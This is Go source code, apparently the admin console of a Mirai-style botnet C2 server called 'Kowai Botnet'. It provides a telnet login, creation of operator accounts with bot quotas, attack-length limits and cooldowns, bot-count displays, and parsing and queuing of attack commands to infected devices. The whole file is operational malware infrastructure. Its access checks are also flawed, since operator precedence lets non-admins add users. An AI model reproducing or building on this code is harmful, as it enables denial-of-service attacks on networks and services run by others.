package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[1;33m[\033[1;35mkowai varient\033[1;33m] \r\n"))
    this.conn.Write([]byte("\033[1;37mUsername\033[1;33m:\033[1;37m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[1;37mPassword\033[1;33m:\033[1;37m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[0;31mWrong Login \033[1;37m:/ \r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            	if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Connected \007", BotCount))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\033[1;33m\r\n"))
    this.conn.Write([]byte("\033[1;35m             :::  === :::====  :::  ===  === :::====  ::: \r\n"))
    this.conn.Write([]byte("\033[1;35m             :\033[1;33m:\033[1;35m: ===  :\033[1;33m:\033[1;35m:  === :\033[1;33m:\033[1;35m:  ===  === :\033[1;33m:\033[1;35m:  \033[1;35=== :\033[1;35m:\033[1;33m: \r\n"))
    this.conn.Write([]byte("\033[1;35m             ======   ===  === ===  =\033[1;33m=\033[1;35m=  === ======== === \r\n"))
    this.conn.Write([]byte("\033[1;35m             === ===  ===  ===  ===========  ===  === === \r\n"))
    this.conn.Write([]byte("\033[1;35m             ===  ===  ======    ==== ====   ===  === === \r\n"))
	this.conn.Write([]byte("\033[1;33mKowai Botnet created by big \033[0;31m& \033[1;33mhax\r\n"))
	this.conn.Write([]byte("\033[1;33m+\033[1;35msuccessfully authenticated using given credentials\033[1;33.\r\n"))
	this.conn.Write([]byte("\033[1;33m+\033[1;35mkowai here to take over \033[1;33m+\r\n"))
	
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[1;33m" + username + "\033[1;37m@\033[1;33mkowai\033[1;35m ~ \033[0;97m"))
        cmd, err := this.ReadLine(false)
        
        if cmd == "kowai" || cmd == "/c"  {

    this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\033[1;33m\r\n"))
    this.conn.Write([]byte("\033[1;35m             :::  === :::====  :::  ===  === :::====  ::: \r\n"))
    this.conn.Write([]byte("\033[1;35m             :\033[1;33m:\033[1;35m: ===  :\033[1;33m:\033[1;35m:  === :\033[1;33m:\033[1;35m:  ===  === :\033[1;33m:\033[1;35m:  \033[1;35=== :\033[1;35m:\033[1;33m: \r\n"))
    this.conn.Write([]byte("\033[1;35m             ======   ===  === ===  =\033[1;33m=\033[1;35m=  === ======== === \r\n"))
    this.conn.Write([]byte("\033[1;35m             === ===  ===  ===  ===========  ===  === === \r\n"))
    this.conn.Write([]byte("\033[1;35m             ===  ===  ======    ==== ====   ===  === === \r\n"))
	this.conn.Write([]byte("\033[1;33mKowai Botnet created by big \033[0;31m& \033[1;33mhax\r\n"))
	this.conn.Write([]byte("\033[1;33m+\033[1;35msuccessfully authenticated using given credentials\033[1;33.\r\n"))
	this.conn.Write([]byte("\033[1;33m+\033[1;35mkowai here to take over \033[1;33m+\r\n"))
            continue
		}

		if cmd == "" || cmd == "c" || cmd == "cls" ||  cmd == "clear" {

			this.conn.Write([]byte("\033[2J\033[1;1H"))
			continue
		}
		
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        
        if cmd == "" {
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "au" || cmd == "+" || cmd == "add" {
            this.conn.Write([]byte("Username\033[0;31m: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Password\033[0;31m: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Bot Count \033[0;31m(-1 Access to All)\033[1;37m: "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Attack Length \033[0;31m(-1 Unlimited)\033[1;37m: "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown \033[0;31m(0 for none)\033[1;37m: "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("User Information: \r\nUsername: " + new_un + "\r\nPassword\033[0;31m: " + new_pw + "\r\nBots[0;31m: " + max_bots_str + "\r\nContinue[0;31m? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[0;31mSuccessfully Added " + new_un + "\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "bots" || cmd  == "/b" {
		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;35m%s\033[1;37m:\033[1;37m\t%d\r\n", k, v)))
            }
            continue
		}
			 
		if userInfo.admin == 1 && cmd == "bots" || cmd  == "b" {
        botCount = clientList.Count()
            this.conn.Write([]byte(fmt.Sprintf("\033[1;33mTotal Bots\033[1;37m:\t%d\r\n", botCount)))
            continue
		} 

	    if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
